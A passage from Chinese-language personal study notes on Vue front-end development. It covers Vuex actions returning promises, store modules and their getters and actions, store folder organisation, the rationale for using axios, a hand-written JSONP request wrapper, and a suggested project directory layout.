  actions: {
    aUpdateInfo(context, payload) {
      setTimeout(() => {

        // 什么时候代表成功 只要commit就会成功 如果不成功就会报错 不会执行到下面
        context.commit('updateInfo')

        // 那就是说? 先mutation里面修改完 然后回调? 成功之后的逻辑可以放在这里
        console.log(payload.message);
        payload.success();
      }, 1000)
    }
  }
```

<br>

### 另一种优雅的做法:  
需求还是跟上面的一样 我希望当action提交mutation修改完成后 通知组件里面逻辑已经完成 这里我们使用promise
```js 
  // actions
  
  actions: {
    aUpdateInfo(context, payload) {

      // 这里 我直接return出去一个 promise 就意味着 组件里接收的也是一个promise对象 可以调用then的方法
      return new Promise((resolve, reject) => {
        setTimeout(() => {

          context.commit('updateInfo', payload)
          console.log(payload);
          
          // 这里还可以传递参数到组件
          resolve('1111');

        }, 1000)
      })
    }
  }


  // 组件: 组件中调用then方法
  updateInfo() {
    this.$store
    .dispatch('aUpdateInfo', '我是组件传递过去的信息')
    .then(res => {
      console.log('里面完成里提交')

      // 打印actions传递过来的参数
      console.log(res)    // 1111
    });
  }
```

<br>

### 优点: 
不仅组件可以向actions里面传递参数, actions中还可以向组件里传递参数

<br>

### 扩展: actions中的方法的返回值会被封装为 promise
所以我们不用在actions中 显示的使用 new Promise() 可以直接在actions中的方法中 return 值

该值就会被包装为 promise

<br>

**示例1:** 
```js
actions: {
  add(context, data) {
    context.commit("add", data)

    // return 一个值 供页面接收使用
    return "hello"
  }
},
```

```js
methods: {
  handler() {
    this.$store.dispatch("add", this.num)
      .then(res => {
        console.log("res", res)  // hello
      })
  }
}


// async await
methods: {
  async handler() {
    const res = await this.$store.dispatch("add", this.num)
    console.log("res", res)
  }
}
```

<br>

### 为什么可以在组件中使用then方法?
action中 aUpdateInfo 方法 整体的 return new Promise对象  

vuex是这样做的 组件中 谁调用了 dispatch('aUpdateInfo') 指向了action中的方法, 那么 promise对象相当于 返回到了组件中

<br><br>

# Vuex扩展: modules的使用详解
上面讲了 state mutation actions getters 还有一个modules, 我们是把所有的状态变量都放在了state中去管理, 但是如果项目越来越大 state 中的变量就会越来越多, 那么就会越来越臃肿

vuex建议我们使用单一状态树, 那么就意味着很多状态都会交给vuex来管理  

当应用变得非常复杂的时候, store对象就有可能变得相当的臃肿  
为了解决这个问题, vuex允许我们将store分割成模块(modules), 而每个模块拥有自己的state mutation actions getter等

```js 
modules: {
  // 定义个模块A
  a: {
    state: {}
    mutations: {}
    actions: {}
    getters: {}
  }

  // 定义个模块b
  b: {
    state: {}
    mutations: {}
    actions: {}
    getters: {}
  }
}
```

<br>

### 在 modules 中的 state
我们在访问modules中的state的时候, 通过 `$store.state.模块名.state属性名`

为什么是 state.a, 模块a不是在modules里面定义的么 因为vuex解析的时候会把模块a放在state中 
```js 
modules: {
  a: {
    state: {
      name:'erin'
    }
  }
}

// 组件中访问模块中的state的时候
$store.state.a.name
```

<br>

### 在modules中的 mutations
1. modules中的 mutations 中的方法的形参 state 是modules中的state 并不是vuex中的state

2. 模块中定义的mutation 组件中也是使用$store.commit()来提交 vuex会先去store实例对象中找 updateName 如果没有会去 modules里去找

```js   
modules: {
  a: {
    state: {
      name:'erin'
    },
    mutations: {
      // 该state是模块中的state
      updateName(state) {
        state.name = 'erinnn'
      }
    }
  }
}
```

<br>

### 需求:
组件修改模块中的state中的name, 具体修改什么前端传值
```js 
// 组件
<button @click='updateName'>修改名字</button>
    // 注意 这里并没有传递值 也就是说不是在组件模板中传值的

methods: {
  updateName() {
    this.$store.commit('updateName', 'mmmmm')
      // 我们在这里传递了值, 而且, 也是使用$store.commit提交的 vuex会先去store实例对象中找 updateName 如果没有会去 modules里去找
  }
}


// vuex中的modules里
mutations: {
  // 定义payload接收组件传递的参数
  updateName(state, payload) {    
    state.name = payload;
  }
}
```

<br>

### 在modules中的getters
组件中使用的时候 也是 通过$store.getters.属性名(方法名) 

在modules中的getters中的方法 可以有第三个参数 rootstate 
```js 
getters: {
  fullname(state, getters, rootstate)
}
```

```js 
// modules:
getters: {
  fullname(state) {
    return state.name + 'love sam nn'
  }
}

<p>{{$store.getters.fullname}}</p>
```

<br>

**需求: 在modules中引用外成state中的属性**
```js 
const store = new Vue.Store({
  state: {
    counter: 1000 
  },

  modules: {
    state: {
      name: 'erin'
    }
    
    getters: {

      // 注意 在 modules 中方法可以有第三个参数 rootstate执行外层store中的state, 必须是第三个参数第二个是getters
      fullname(state, getters, rootstate) {
        return state.name + rootstate.counter
      }
    }
  }
})

// 组件
<p>{{$store.getters.fullname}}</p>
```

**要点: 模块下的getters对象中的函数里面还有 rootstate 第三个参数**

<br>

### 在 modules 中的 actions
actions中有一个参数叫context 这个只是modules 模块中的上下文对象 指向的都是模块中的东西

context中还是有很多东西的 有很多实用的属性 可以打印下看看
```js 
// 之前我们都是 这么写
aUpdateName(context) { ... }

// 其实还可以这么写  利用对象的解构 将context中的属性解构出来 我们从context中取出了三个属性
aUpdateName({state, commit, rootState}) { ... }
```

```js 
// 注意 模块中的actions中的方法中的context 指向的不是store实例对象中的mutations 而是自己模块中的mutations

const moduleA = {
state: {
  name:'erin',
},
mutations: {
  updateName(state, payload) {
    state.name = payload;
  }
},

// 使用context.commit('') 提交到modules中的mutations里 updateName 我们异步修改下 模块中的变量 name
actions: {
  aUpdateName(context) {
    setTimeout(() => {
      context.commit('updateName', 'liuliuliu')
    }, 1000)
  }
}
}


// 组件中
<button @click='asyncUpdateName'>异步修改名字</button>

asyncUpdateName() {

  // 这里也是直接使用 $store.dispatch('到模块中的actions中的方法')
  this.$store.dispatch('aUpdateName');
}
```

<br><br>

# 扩展Vuex: store的文件夹的目录组织
store文件夹是作为vue相关状态管理的文件夹
```js
| - store
  - index.js        // 我们组装模块并导出store的地方
  - actions.js      // 根级别的 actions
  - mutations.js    // 根级别的 mutations

  | - modules
    - cart.js       // 购物车模块
    - products.js   // 产品模块
```

我们上面 vuex 相关的代码都是写在index.js文件里面, 但是随着项目代码不断的增多, 这个文件中的代码太多就变的越发的不容易管理

vue建议我们对index.js中的文件代码做抽离

```js 
  // index.js文件中

  const state = {
    
    这里放状态变量

  }


  const store = new Vuex.Store({
    // 也就是说将代码抽离到实例的外面
    state,

    // 不建议抽离在index.js文件中 而是将到抽离到别的js文件 利用导出和导入关联起来
    mutations,

    ...

    // 这个的抽离建议创建一个文件夹
    modules       
  })
```

<br><br>

# 扩展: 计算属性 和 生命周期的执行顺序
```js
created - computed - mounted
```

<br><br>

# Axios
程序开发中离不开请求, 即使我们选择了第三方框架 我们也对这个第三方框架进行封装, 然后使用我们自己封装好的模块进行网络请求  

我们不会直接使用第三方框架, 因为有一天它可能不维护了 或者 出现了严重的bug

<br>

### 选择什么网络模块?
传统的ajax是基于XMLHttpRequest 为什么不用它?
- 配置和调用方式非常混乱
- 编码起来看起来非常的蛋疼
- 真是开发中是使用jQ-ajax

<br>

### jQ-ajax 为什么不用它?
- 相对于传统的ajax非常好用
- 但是在Vue的整个开发中都是不需要使用jQ了
- jQ是一个重量级的框架, 没必要为了使用jQ的ajax就引用一个如此大的框架

<br>

### vue 1.x版本的时候 官方退出了vue-resource 为什么不选择它?
在vue2.0推出后, vue作者就在github的issues中说了去掉vue-resource并且以后不会更新

<br>

### 总结: 
之后我们会对axios来进行封装并做深入的了解

<br>

### jsonp 的封装:
在前端开发中 我们一种常见的网络请求方式就是jsonp, 使用jsonp最主要的原因是为了解决跨域访问的问题

<br>

### jsonp的原理:
jsonp的核心在于通过``<script>``标签的src来帮助我们请求数据 原因是我们的项目部署在domain1.com服务器上时, 是不能直接访问domain2.com服务器上的资料的  

这个时候我们利用``<script>``标签的src帮助我们去服务器请求到数据, 将数据当做一个js的函数来执行, 并且执行的过程中传入我们需要的json

所以 封装jsonp的核心就在于我们监听window上的jsonp进行回调时的名称

<br>

### 封装 jsonp:
```js 
let count = 1;

export default function originPJSONP(option) {
  // 1 从传入的option中提取url
  const url = option.url;

  // 2 在body中添加script标签
  const body = document.getElementsByTagName('body')[0];
  const script = document.createElement('script');

  // 3 内部生产一个不重复的callback
  const callback = 'jsonp' + count++

  // 4 监听window上的jsonp的调用
  return new Promise((resolve, reject) => {
    try {
      window[callback] = function(result) {
        body.removeChild(script)
        resolve(result)
      }
      const params = handleParam(option.data);
      script.src = url + '?callback=' + callback + params;
      body.appendChild(script)
    } catch (err) {
      body.removeChild(script)
      reject(err)
    }
  })
}

function handleParam(data) {
  let url = ''
  for(let key in data) {
    let value = data[key] !== undefined ? data[key] :''
    url += `&${key}=${encodeURIComponent(value)}`
  }
  return url
}
```

<br><br>

# 项目开发 - 划分目录结构
当有一个新的项目时, 应该做的第一件事就是划分目录结构, 我们只需要负责 src 文件夹的结构划分就可以 一般其它的都不需要动的

```js
| - src
  // 资源 比如图片 css 
  | - assets        
    | - img
    | - css
      - normalize.css
      - base.css

  // 公共组件 比如这个组件既在home又在category用
  | - components  
    // 当前项目下共用的组件 甚至是下一个项目也可共用的组件  
    | - common      
    // 只跟当前项目中是共用的组件
    | - content     
  
  // 大的视图 首页之类的
  | - views         

  | - router
  | - store         // vuex
  | - network       // 网络相关的
  | - common        // 公共的js文件
    - const.js      //  当有一些公共的常量要抽取的时候放在这里
    - utils         // 工具函数 工具类
    - mixin.js      // 混入
```

<br><br>

# 项目开发 - css文件的引入
我们在放css的文件夹里面放了两个css文件 base.css 和 normalize.css

<br>

我们在base.css中引入normalize.css
```js 
@import './normalize.css';
```

<br>

在App.vue文件中 引入base.css
```js 
<style>
  @import './assets/css/base.css';
</style>
```